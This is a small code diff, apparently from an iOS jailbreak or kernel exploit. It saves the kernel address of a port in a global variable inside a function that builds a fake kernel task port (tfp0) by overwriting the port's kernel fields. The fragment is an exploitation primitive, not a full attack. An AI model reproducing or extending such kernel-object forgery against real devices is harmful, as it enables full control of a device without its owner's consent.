@@ -18,6 +18,8 @@
 #include "kcall.h"
 #include "kdbg.h"
 
+uint64_t the_port_kaddr;
+
 // various prototypes and structure definitions for missing iOS headers:
 
 kern_return_t mach_vm_read(
@@ -385,6 +387,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   
   // now make the changes to the port object to make it a task port:
   uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
+  the_port_kaddr = port_kaddr;
   
   wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
   wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
